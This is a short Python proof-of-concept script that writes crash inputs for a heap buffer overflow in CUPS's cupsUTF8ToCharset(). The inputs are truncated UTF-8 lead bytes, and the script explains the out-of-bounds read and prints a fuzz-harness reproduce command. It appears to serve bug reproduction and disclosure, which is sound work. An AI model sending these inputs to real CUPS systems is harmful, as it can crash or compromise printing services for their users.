#!/usr/bin/env python3
"""
PoC Generator for Heap Buffer Overflow in cupsUTF8ToCharset()

This script generates test cases that trigger the vulnerability.
"""

import os

def generate_poc():
    """Generate the crash test case."""

    # Crash input: 0x0A (newline) + 0xC1 (2-byte UTF-8 lead byte without continuation)
    poc_data = bytes([0x0A, 0xC1])

    output_file = "poc_crash.bin"
    with open(output_file, "wb") as f:
        f.write(poc_data)

    print(f"Generated: {output_file}")
    print(f"Content: {poc_data.hex()}")
    print(f"Size: {len(poc_data)} bytes")
    print()
    print("Explanation:")
    print("  0x0A = ASCII newline (valid 1-byte UTF-8)")
    print("  0xC1 = 2-byte UTF-8 lead byte (expects continuation byte)")
    print()
    print("When null-terminated as [0x0A, 0xC1, 0x00]:")
    print("  - Parser reads 0x0A, outputs it")
    print("  - Parser reads 0xC1, identifies as 2-byte sequence")
    print("  - Parser reads 0x00 as continuation byte, advances pointer past buffer")
    print("  - Next loop iteration reads out-of-bounds memory -> CRASH")

def generate_variants():
    """Generate additional test case variants."""

    variants = {
        # Different lead bytes that trigger the same bug
        "poc_c0.bin": bytes([0xC0]),           # Minimal: just lead byte
        "poc_c1.bin": bytes([0xC1]),           # Another 2-byte lead
        "poc_df.bin": bytes([0xDF]),           # Max 2-byte lead (0xC0-0xDF range)

        # 3-byte sequence lead bytes (may have similar issue)
        "poc_e0.bin": bytes([0xE0]),           # 3-byte lead
        "poc_ef.bin": bytes([0xEF]),           # Max 3-byte lead

        # 4-byte sequence lead bytes
        "poc_f0.bin": bytes([0xF0]),           # 4-byte lead
        "poc_f4.bin": bytes([0xF4]),           # Max valid 4-byte lead

        # With prefix data
        "poc_prefix_c1.bin": b"hello" + bytes([0xC1]),
        "poc_prefix_e0.bin": b"test" + bytes([0xE0]),
    }

    for filename, data in variants.items():
        with open(filename, "wb") as f:
            f.write(data)
        print(f"Generated: {filename} ({data.hex()})")

if __name__ == "__main__":
    os.makedirs("poc", exist_ok=True)
    os.chdir("poc")

    print("=== Primary PoC ===")
    generate_poc()

    print()
    print("=== Variant PoCs ===")
    generate_variants()

    print()
    print("To reproduce:")
    print("  python3 infra/helper.py reproduce cups fuzz_transcode poc/poc_crash.bin")
